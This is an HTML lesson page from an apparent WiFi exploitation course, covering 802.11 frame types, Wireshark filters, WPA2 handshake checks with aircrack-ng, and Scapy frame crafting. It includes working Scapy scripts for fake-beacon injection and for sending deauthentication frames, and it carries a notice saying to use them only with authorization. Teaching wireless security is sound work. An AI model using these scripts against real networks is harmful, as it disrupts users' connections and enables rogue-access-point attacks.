<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Module 04 — Packet Analysis | WiFi Exploitation Course</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
      --font-body:'Segoe UI',system-ui,sans-serif;
    }
    html { scroll-behavior: smooth; }
    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
    .page-wrapper { display:flex; min-height:100vh; }

    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
    .sidebar-nav { padding:16px 0; }
    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }

    main { flex:1; padding:48px 64px; max-width:960px; }

    .module-header { margin-bottom:40px; }
    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
    .breadcrumb a { color:var(--accent); text-decoration:none; }
    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }

    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
    .warning-box strong { color:#e3b341; }

    section { margin-bottom:52px; }
    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
    p { margin-bottom:12px; }

    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .terminal-dots { display:flex; gap:6px; }
    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
    .terminal-title { font-size:11px; color:var(--text-dim); }
    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
    .prompt { color:var(--accent2); user-select:none; }
    .cmd { color:#e6edf3; }
    .flag { color:#ffa657; }
    .str { color:#a5d6ff; }
    .cmt { color:#6e7681; font-style:italic; }
    .out { color:var(--text-dim); }
    .out-ok { color:var(--accent2); }
    .out-warn { color:var(--warn); }
    .out-err { color:var(--accent3); }
    .out-key { color:#d2a8ff; }
    .out-val { color:#7ee787; }

    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    thead tr { background:rgba(88,166,255,0.06); }
    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
    tr:last-child td { border-bottom:none; }
    tr:hover td { background:rgba(88,166,255,0.03); }
    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
    code.tag { background:rgba(247,129,102,0.15); color:#f78166; }
    code.val { background:rgba(63,185,80,0.15); color:#7ee787; }

    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
    .callout .ci { flex-shrink:0; font-size:16px; }
    .callout strong { color:var(--text-head); }

    /* Filter builder */
    .filter-builder { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:20px 0; }
    .filter-builder h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
    .filter-chips { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:12px; }
    .filter-chip { background:var(--bg); border:1px solid var(--border); border-radius:20px; padding:6px 14px; font-size:12px; cursor:pointer; transition:all 0.15s; font-family:var(--font-mono); }
    .filter-chip:hover { border-color:var(--accent); color:var(--accent); }
    .filter-chip.active { background:rgba(88,166,255,0.2); border-color:var(--accent); color:var(--accent); }
    .filter-preview { background:var(--bg-code); border:1px solid var(--border); border-radius:6px; padding:12px 16px; font-family:var(--font-mono); font-size:13px; color:var(--accent2); }
    .filter-output { margin-top:12px; padding:12px 16px; background:var(--bg-code); border:1px solid var(--border); border-radius:6px; font-family:var(--font-mono); font-size:12px; line-height:1.8; }
    .filter-output .pkt { color:var(--text-dim); }
    .filter-output .field { color:var(--accent); }
    .filter-output .op { color:var(--warn); }
    .filter-output .val { color:var(--accent2); }

    /* Scapy code display */
    .scapy-code { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; }
    .scapy-header { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .scapy-body { padding:16px 18px; font-family:var(--font-mono); font-size:12px; line-height:1.9; }
    .scapy-keyword { color:#ff7b72; }
    .scapy-string { color:#a5d6ff; }
    .scapy-comment { color:#6e7681; font-style:italic; }
    .scapy-func { color:#d2a8ff; }

    /* Frame type visualizer */
    .frame-types { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:12px; margin:20px 0; }
    .frame-type-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:16px; }
    .frame-type-card.management { border-left:3px solid var(--accent); }
    .frame-type-card.control { border-left:3px solid var(--warn); }
    .frame-type-card.data { border-left:3px solid var(--accent2); }
    .frame-type-card h4 { font-size:13px; color:var(--text-head); margin-bottom:8px; }
    .frame-type-card .type-num { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); margin-bottom:8px; }
    .frame-type-card .subtypes { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); }

    /* Handshake diagram */
    .handshake-diagram { display:flex; justify-content:space-between; align-items:center; margin:24px 0; flex-wrap:wrap; gap:16px; }
    .hs-msg { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:16px; text-align:center; flex:1; min-width:140px; }
    .hs-msg h4 { font-size:12px; color:var(--text-head); margin-bottom:8px; }
    .hs-msg .num { display:inline-block; width:24px; height:24px; border-radius:50%; background:var(--accent); color:#0d1117; font-weight:bold; line-height:24px; margin-bottom:8px; }
    .hs-msg .contents { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); line-height:1.6; }
    .hs-arrow { color:var(--text-dim); font-size:20px; }

    /* Nav footer */
    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
    .nav-btn.next { background:var(--accent); color:#0d1117; }
    .nav-btn.next:hover { background:#79c0ff; }
    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }

    ::-webkit-scrollbar { width:6px; height:6px; }
    ::-webkit-scrollbar-track { background:var(--bg); }
    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
  </style>
</head>
<body>
<div class="page-wrapper">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="course-title">WiFi Exploitation Course</div>
      <h2>Wireless Security</h2>
    </div>
    <nav class="sidebar-nav">
      <div class="sidebar-section-label">Tier 1 — Foundations</div>
      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
      <div class="sidebar-section-label">Tier 2 — Recon</div>
      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
      <a href="#" class="active"><span class="mod-num">04</span> Packet Analysis</a>
      <div class="sidebar-section-label">Tier 3 — Legacy</div>
      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
      <div class="sidebar-section-label">Tier 7 — WPS</div>
      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
      <div class="sidebar-section-label">Tier 8 — Modern</div>
      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
      <div class="sidebar-section-label">Tier 9 — Chaining</div>
      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
    </nav>
  </aside>

  <main>
    <div class="module-header">
      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 04</div>
      <div class="module-badge">&#9679; Tier 2 &mdash; Reconnaissance</div>
      <h1>Packet Analysis with Wireshark &amp; Scapy</h1>
      <p class="subtitle">Learn to analyze 802.11 frames in Wireshark, identify packet types, verify handshakes, and craft custom frames with Scapy for advanced wireless testing.</p>
      <div class="meta-row">
        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> Intermediate</div>
        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~50 min</div>
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Wireshark + Python</div>
      </div>
    </div>

    <div class="warning-box">
      <p><strong>Legal Notice:</strong> Packet analysis should only be performed on captures from networks you own or have explicit authorization to test. Frame crafting capabilities must only be used in authorized testing environments.</p>
    </div>

    <!-- Section 1: Frame Types -->
    <section id="frames">
      <h2><span class="section-num">01</span> 802.11 Frame Types</h2>
      <p>All wireless traffic falls into three categories. Click each type to see common subtypes.</p>

      <div class="frame-types">
        <div class="frame-type-card management">
          <h4>&#128241; Management Frames</h4>
          <div class="type-num">Type: 0x00</div>
          <div class="subtypes">
            0x00 Association Req<br>
            0x01 Association Resp<br>
            0x04 Probe Request<br>
            0x05 Probe Response<br>
            0x08 Beacon<br>
            0x0B Authentication<br>
            0x0C Deauthentication
          </div>
        </div>
        <div class="frame-type-card control">
          <h4>&#128225; Control Frames</h4>
          <div class="type-num">Type: 0x01</div>
          <div class="subtypes">
            0x01 Block ACK<br>
            0x05 CTS<br>
            0x06 ACK<br>
            0x08 RTS
          </div>
        </div>
        <div class="frame-type-card data">
          <h4>&#128190; Data Frames</h4>
          <div class="type-num">Type: 0x02</div>
          <div class="subtypes">
            0x00 Data<br>
            0x01 Data + ACK<br>
            0x04 Null (no data)<br>
            0x08 QoS Data
          </div>
        </div>
      </div>

      <div class="callout info">
        <span class="ci">&#128269;</span>
        <div><strong>Key insight:</strong> Management frames like beacons, probe requests, and authentication frames are often unencrypted. This is why you can see SSIDs and other metadata even on WPA2 networks without knowing the password.</div>
      </div>
    </section>

    <!-- Section 2: Wireshark Filters -->
    <section id="filters">
      <h2><span class="section-num">02</span> Wireshark Display Filters</h2>
      <p>Build filters to isolate specific frame types and traffic.</p>

      <div class="filter-builder">
        <h3>&#128269; Interactive Filter Builder</h3>
        <div class="filter-chips">
          <span class="filter-chip" onclick="addFilter('wlan.fc.type == 0', this)">Management</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.type == 1', this)">Control</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.type == 2', this)">Data</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.subtype == 8', this)">Beacon</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.subtype == 4', this)">Probe Req</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.subtype == 5', this)">Probe Resp</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.subtype == 12', this)">Deauth</span>
          <span class="filter-chip" onclick="addFilter('wlan.fc.subtype == 11', this)">Auth</span>
          <span class="filter-chip" onclick="addFilter('eapol', this)">EAPOL</span>
          <span class="filter-chip" onclick="addFilter('wlan.bssid ==', this)">BSSID</span>
        </div>
        <div class="filter-preview" id="filterPreview">Click filters above to build...</div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Common Wireshark filters for wireless</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-filters')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-filters"><span class="cmt"># All beacons</span>
<span class="cmd">wlan.fc.type == 0 && wlan.fc.subtype == 8</span>

<span class="cmt"># Probe requests from specific client</span>
<span class="cmd">wlan.fc.type == 0 && wlan.fc.subtype == 4 && wlan.addr == 11:22:33:44:55:66</span>

<span class="cmt"># All frames to/from specific AP</span>
<span class="cmd">wlan.bssid == aa:bb:cc:dd:ee:ff</span>

<span class="cmt"># WPA handshake (EAPOL frames)</span>
<span class="cmd">eapol</span>

<span class="cmt"># Encrypted data frames</span>
<span class="cmd">wlan.fc.type == 2 && wlan.fc.protected == 1</span></div>
      </div>
    </section>

    <!-- Section 3: WPA2 Handshake -->
    <section id="handshake">
      <h2><span class="section-num">03</span> WPA2 4-Way Handshake Analysis</h2>
      <p>The handshake establishes session keys without transmitting the password. Here's how it works:</p>

      <div class="handshake-diagram">
        <div class="hs-msg">
          <div class="num">1</div>
          <h4>AP &#8594; Client</h4>
          <div class="contents">ANonce<br>(random value)</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">2</div>
          <h4>Client &#8594; AP</h4>
          <div class="contents">SNonce + MIC<br>+ RSN IE</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">3</div>
          <h4>AP &#8594; Client</h4>
          <div class="contents">ANonce + GTK<br>+ MIC</div>
        </div>
        <div class="hs-arrow">&#8594;</div>
        <div class="hs-msg">
          <div class="num">4</div>
          <h4>Client &#8594; AP</h4>
          <div class="contents">Confirm<br>+ MIC</div>
        </div>
      </div>

      <div class="callout tip">
        <span class="ci">&#128161;</span>
        <div><strong>Verification:</strong> In Wireshark, filter with <code>eapol</code>. Each of the 4 messages has a different "Key Information" value. In aircrack-ng, look for "WPA (1) handshake" or "WPA2 (1) handshake" in the output.</div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Verify handshake with aircrack-ng</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-hc')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-hc"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aircrack-ng <span class="str">capture-01.cap</span></span>
<span class="out">Opening capture-01.cap</span>
<span class="out">Read 1524 packets.</span>
<span class="out">#  BSSID              ESSID                    Encryption</span>
<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyNetwork                WPA2 (1) handshake</span>
<span class="out">2  00:11:22:33:44:55  OfficeAP                  WPA (0) handshake</span>
<span class="out-warn">Number of IVs: 0</span></div>
      </div>
    </section>

    <!-- Section 4: Scapy -->
    <section id="scapy">
      <h2><span class="section-num">04</span> Crafting Frames with Scapy</h2>
      <p>Scapy lets you build custom 802.11 frames for testing and attacks.</p>

      <div class="scapy-code">
        <div class="scapy-header">
          <span class="terminal-title">Beacon Frame Injection</span>
        </div>
        <div class="scapy-body"><span class="scapy-comment">#!/usr/bin/env python3</span>
<span class="scapy-keyword">from</span> scapy.all <span class="scapy-keyword">import</span> *

<span class="scapy-comment"># AP configuration</span>
ap_mac = <span class="scapy-string">"aa:bb:cc:dd:ee:ff"</span>
ssid = <span class="scapy-string">"FreeWiFi"</span>

<span class="scapy-comment"># Build beacon packet</span>
packet = RadioTap() / Dot11(
    addr1=<span class="scapy-string">"ff:ff:ff:ff:ff:ff"</span>,  <span class="scapy-comment"># Destination</span>
    addr2=ap_mac,                        <span class="scapy-comment"># Source (AP)</span>
    addr3=ap_mac                         <span class="scapy-comment"># BSSID</span>
) / Dot11Beacon() / Dot11Elt(
    ID=<span class="scapy-string">"SSID"</span>, 
    info=ssid
) / Dot11Elt(
    ID=<span class="scapy-string">"DSSet"</span>, 
    info=<span class="scapy-string">b'</span><span class="scapy-val">\x06</span><span class="scapy-string">'</span>  <span class="scapy-comment"># Channel 6</span>
)

<span class="scapy-comment"># Send it</span>
<span class="scapy-func">sendp</span>(packet, iface=<span class="scapy-string">"wlan0mon"</span>, loop=<span class="scapy-keyword">True</span>, inter=<span class="scapy-val">0.1</span>)</div>
      </div>

      <div class="scapy-code">
        <div class="scapy-header">
          <span class="terminal-title">Deauthentication Frame</span>
        </div>
        <div class="scapy-body"><span class="scapy-keyword">from</span> scapy.all <span class="scapy-keyword">import</span> *

ap_mac = <span class="scapy-string">"aa:bb:cc:dd:ee:ff"</span>
client_mac = <span class="scapy-string">"11:22:33:44:55:66"</span>

packet = RadioTap() / Dot11(
    addr1=client_mac,  <span class="scapy-comment"># Recipient</span>
    addr2=ap_mac,       <span class="scapy-comment"># Sender</span>
    addr3=ap_mac        <span class="scapy-comment"># BSSID</span>
) / Dot11Deauth(reason=<span class="scapy-val">7</span>)

<span class="scapy-func">sendp</span>(packet, iface=<span class="scapy-string">"wlan0mon"</span>, count=<span class="scapy-val">10</span>)</div>
      </div>

      <div class="callout warn">
        <span class="ci">&#9888;</span>
        <div><strong>Prerequisite:</strong> Scapy requires monitor mode and packet injection support. Test with <code>sudo aireplay-ng -9 wlan0mon</code> before running Scapy wireless scripts.</div>
      </div>
    </section>

    <!-- Section 5: Common Filters -->
    <section id="common">
      <h2><span class="section-num">05</span> Common Packet Patterns</h2>
      <p>Quick reference for identifying common wireless traffic patterns.</p>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Goal</th><th>Filter</th></tr>
          </thead>
          <tbody>
            <tr><td>Find authentication frames</td><td><code>wlan.fc.type == 0 && wlan.fc.subtype == 11</code></td></tr>
            <tr><td>Find association frames</td><td><code>wlan.fc.type == 0 && wlan.fc.subtype &lt; 2</code></td></tr>
            <tr><td>Find broadcast traffic</td><td><code>wlan.da == ff:ff:ff:ff:ff:ff</code></td></tr>
            <tr><td>Find encrypted data</td><td><code>wlan.fc.protected == 1</code></td></tr>
            <tr><td>Find retried packets</td><td><code>wlan.fc.retry == 1</code></td></tr>
            <tr><td>Filter by SSID</td><td><code>wlan.ssid == "MyNetwork"</code></td></tr>
            <tr><td>Find specific vendor (OUI)</td><td><code>wlan.addr[0:3] == 00:11:22</code></td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Nav -->
    <div class="nav-footer">
      <a href="../module-03-reconnaissance/" class="nav-btn prev">&#8592; Module 03: Reconnaissance</a>
      <a href="../module-05-wep-cracking/" class="nav-btn next">Module 05: WEP Cracking &#8594;</a>
    </div>
  </main>
</div>

<script>
  // Filter builder
  let currentFilter = '';

  function addFilter(frag, el) {
    const chips = document.querySelectorAll('.filter-chip');
    chips.forEach(c => c.classList.remove('active'));
    
    if (frag.includes('==') && !frag.endsWith('==')) {
      currentFilter = frag;
      el.classList.add('active');
    } else if (currentFilter.includes('==') && currentFilter.endsWith('==')) {
      currentFilter = currentFilter + ' ' + frag;
      el.classList.add('active');
    } else {
      if (currentFilter && !currentFilter.includes(' && ')) {
        currentFilter = currentFilter + ' && ' + frag;
      } else {
        currentFilter = frag;
      }
    }
    
    document.getElementById('filterPreview').textContent = currentFilter;
  }

  // Copy terminal
  function copyTerm(btn, id) {
    const el = document.getElementById(id);
    const text = el.innerText || el.textContent;
    navigator.clipboard.writeText(text.trim()).then(() => {
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  }
</script>
</body>
</html>
